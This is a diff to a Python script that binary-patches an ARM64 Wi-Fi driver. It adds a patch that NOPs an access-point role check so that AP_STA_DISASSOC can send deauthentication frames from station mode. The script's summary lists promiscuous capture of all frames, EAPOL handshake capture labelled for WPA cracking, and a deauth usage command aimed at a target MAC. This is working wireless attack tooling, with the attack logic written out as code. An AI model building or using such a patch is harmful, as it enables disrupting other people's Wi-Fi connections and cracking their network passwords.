@@ -26,11 +26,14 @@ SYMBOLS = {
     'nicCmdEventSetCommon':         None,  # resolved from wlanoidSetCurrentPacketFilter
     'nicOidCmdTimeoutCommon':       None,
     'wlanSendSetQueryCmd':          0x62794,
+    'priv_driver_set_ap_sta_disassoc': 0xb0a28,
+    'ap_sta_disassoc_role_check':  0xb0a98,  # cbnz w0, skip — the AP role check to NOP
 }
 
 ICS_FLAG_OFFSET = 0x2a86b0
 PACKET_FILTER_OFFSET = 0x10  # adapter + 0x10 stores current packet filter
 PROMISCUOUS_FILTER = 0x0F    # bits 0-3: accept all frame types
+NOP_ARM64 = 0xd503201f      # ARM64 NOP instruction
 
 
 def read_elf_sections(data):
@@ -314,10 +317,20 @@ def patch_driver(input_path, output_path):
     # Write T3
     data[t3_off:t3_off+len(t3_code)] = t3_code
 
+    # Patch 4: NOP the AP role check in priv_driver_set_ap_sta_disassoc
+    # This allows "AP_STA_DISASSOC Mac=<target>" to work in STA mode for deauth injection
+    role_check_off = sym_off('ap_sta_disassoc_role_check')
+    orig_insn = struct.unpack_from('<I', data, role_check_off)[0]
+    if (orig_insn & 0xFF000000) == 0x35000000:  # cbnz
+        data[role_check_off:role_check_off+4] = struct.pack('<I', NOP_ARM64)
+        print(f"  [4] AP_STA_DISASSOC role check: cbnz → NOP (deauth in STA mode)")
+    else:
+        print(f"  [!] AP_STA_DISASSOC role check @ 0x{role_check_off:x}: unexpected insn 0x{orig_insn:08x}, skipping")
+
     # Update .text section size
     new_text_size = (text_size + total_patch_size + 15) & ~15
     struct.pack_into('<Q', data, text_sec['hdr_offset'] + 32, new_text_size)
-    print(f"  [4] .text size: 0x{text_size:x} → 0x{new_text_size:x}")
+    print(f"  [5] .text size: 0x{text_size:x} → 0x{new_text_size:x}")
 
     # Write output
     print(f"\n[*] Writing {output_path}")
@@ -327,7 +340,7 @@ def patch_driver(input_path, output_path):
     patched_hash = hashlib.sha256(data).hexdigest()
 
     print(f"\n{'='*60}")
-    print("PATCH v2 SUMMARY")
+    print("PATCH v3 SUMMARY")
     print(f"{'='*60}")
     print(f"SHA256 original: {orig_hash}")
     print(f"SHA256 patched:  {patched_hash}")
@@ -335,13 +348,16 @@ def patch_driver(input_path, output_path):
     print(f"  1. RX path → ICS logging     (capture all received frames)")
     print(f"  2. Enable promiscuous mode    (firmware cmd 10, filter=0x0F)")
     print(f"  3. Disable promiscuous mode   (firmware cmd 10, filter=0x01)")
+    print(f"  4. AP_STA_DISASSOC role check → NOP (deauth injection in STA mode)")
     print(f"\nCapabilities:")
     print(f"  ✓ Beacons, Probe Req/Resp     (scan)")
     print(f"  ✓ Data, QoS-Data              (traffic)")
     print(f"  ✓ RTS, CTS, ACK               (control)")
     print(f"  ✓ EAPOL / 4-way handshake     (WPA cracking)")
-    print(f"  ✓ Deauth, Disassoc            (attack detection)")
+    print(f"  ✓ Deauth injection            (AP_STA_DISASSOC in STA mode)")
     print(f"  ✓ Frames d'AUTRES devices     (mode promiscuous)")
+    print(f"\nDeauth usage:")
+    print(f"  wpa_driver 'AP_STA_DISASSOC Mac=AA:BB:CC:DD:EE:FF'")
 
     return True
 
